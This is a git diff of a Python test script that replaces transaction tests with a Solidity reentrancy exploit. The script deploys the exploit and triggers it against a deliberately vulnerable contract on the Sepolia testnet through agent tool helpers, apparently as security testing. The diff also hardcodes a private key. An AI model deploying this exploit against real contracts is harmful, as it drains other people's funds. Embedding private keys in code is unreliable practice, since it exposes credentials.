@@ -109,9 +109,9 @@
 
 
 from web3 import Web3
-import json
 import os
-from api.agents.tools import *
+import json
+from api.agents.tools import compile_solidity_contract, deploy_malicious_contract, trigger_reentrancy_attack
 from api.web3_connection import get_web3_connection
 
 # Load the ABI for the BasicVulnerableContract
@@ -122,7 +122,6 @@ with open(abi_path, 'r') as f:
 # Define contract address and private key
 my_contract_address = "0x8AdD1b01116cAcAE62D9bcCbF43aa002C47CF2e7"
 private_key = "a4af72ca5e6acefeea8593fd689892757bfd2df55bd7aff7b8d410cf4846a995"
-test_user_address = "0x13d6Fa5134AA6FC64E43679F9E24B7788c3Ab8E9"
 
 # Initialize Web3 connection
 w3 = get_web3_connection()
@@ -140,65 +139,74 @@ def check_account_balance():
         print(f"Error in checking account balance: {str(e)}")
         return None
 
-# Test retry_transaction tool
-def test_retry_transaction():
-    print("Testing retry_transaction")
-    try:
-        # Set a small amount for withdrawal
-        withdraw_amount = w3.to_wei(0.0005, 'ether')
-        txn_hash = retry_transaction(
-            w3, private_key, my_contract_address, basic_contract_abi, "withdraw", withdraw_amount, retries=3
-        )
-        print(f"Withdraw transaction hash (retry_transaction): {txn_hash}")
-    except Exception as e:
-        print(f"Error in retry_transaction: {str(e)}")
+# Test deploying the malicious contract
+def test_deploy_malicious_contract():
+    print("Deploying malicious contract for reentrancy attack...")
+    malicious_contract_source = """
+    pragma solidity ^0.8.0;
 
-def test_submit_batch_transactions():
-    print("Testing submit_batch_transactions")
-    try:
-        # Prepare multiple transactions (deposit and withdraw)
-        function_names_and_args = [
-            ("deposit", []),  # Deposit without arguments
-            ("withdraw", [w3.to_wei(0.0005, 'ether')]),  # Withdraw 0.0005 ether
-        ]
-
-        # Get the initial nonce
-        account = w3.eth.account.from_key(private_key)
-        nonce = w3.eth.get_transaction_count(account.address)
+    contract MaliciousReentrancy {
+        address public vulnerableContract;
         
-        txns = []
-        for i, (function_name, args) in enumerate(function_names_and_args):
-            contract = w3.eth.contract(address=Web3.to_checksum_address(my_contract_address), abi=basic_contract_abi)
-            function = getattr(contract.functions, function_name)
-            txn = function(*args).build_transaction({
-                'from': account.address,
-                'nonce': nonce + i,  # Increment nonce for each transaction
-                'gas': 2000000,
-                'maxPriorityFeePerGas': w3.to_wei(5, 'gwei'),  # Further increased priority fee
-                'maxFeePerGas': w3.eth.gas_price + w3.to_wei(15, 'gwei'),  # Further increase max fee
-                'chainId': 11155111  # Sepolia chain ID
-            })
-            txns.append(txn)
+        constructor(address _vulnerableContract) {
+            vulnerableContract = _vulnerableContract;
+        }
 
-        # Sign and send all transactions
-        signed_txns = [w3.eth.account.sign_transaction(txn, private_key=private_key) for txn in txns]
-        txn_hashes = [w3.eth.send_raw_transaction(signed_txn.raw_transaction).hex() for signed_txn in signed_txns]
+        function attack() public payable {
+            require(msg.value > 0);
+            (bool success,) = vulnerableContract.call{value: msg.value}(
+                abi.encodeWithSignature("withdraw(uint256)", msg.value)
+            );
+            require(success, "Attack failed");
+        }
 
-        print(f"Batch transaction hashes: {txn_hashes}")
+        receive() external payable {
+            // Reentrancy attack logic here
+            if (address(vulnerableContract).balance > 0) {
+                (bool success,) = vulnerableContract.call(
+                    abi.encodeWithSignature("withdraw(uint256)", msg.value)
+                );
+                require(success, "Reentrancy failed");
+            }
+        }
+    }
+    """
+    try:
+        compiled_contract = compile_solidity_contract(malicious_contract_source)
+        if compiled_contract:
+            contract_address = deploy_malicious_contract(
+                w3, private_key, compiled_contract['bytecode'], compiled_contract['abi'], my_contract_address
+            )
+            print(f"Malicious contract deployed at: {contract_address}")
+            return contract_address, compiled_contract['abi']
+        else:
+            print("Compilation failed.")
+            return None, None
     except Exception as e:
-        print(f"Error in submit_batch_transactions: {str(e)}")
+        print(f"Error in deploying malicious contract: {e}")
+        return None, None
 
-
-
+# Test triggering the reentrancy attack
+def test_trigger_reentrancy_attack(malicious_contract_address, malicious_contract_abi):
+    print("Triggering reentrancy attack...")
+    try:
+        txn_hash = trigger_reentrancy_attack(w3, private_key, malicious_contract_abi, malicious_contract_address)
+        print(f"Reentrancy attack triggered, transaction hash: {txn_hash}")
+    except Exception as e:
+        print(f"Error in triggering reentrancy attack: {e}")
 
 def main():
     # Check the account balance first
     balance_in_eth = check_account_balance()
 
     # Proceed with the tests only if there is sufficient balance
-    if balance_in_eth is not None and balance_in_eth > 0.0005:
-        test_retry_transaction()  # Test the retry_transaction function
-        test_submit_batch_transactions()  # Test the submit_batch_transactions function
+    if balance_in_eth is not None and balance_in_eth > 0.1:
+        # Test deploying the malicious contract
+        malicious_contract_address, malicious_contract_abi = test_deploy_malicious_contract()
+
+        # If the deployment was successful, trigger the reentrancy attack
+        if malicious_contract_address and malicious_contract_abi:
+            test_trigger_reentrancy_attack(malicious_contract_address, malicious_contract_abi)
     else:
         print("Insufficient balance to perform transactions")
 
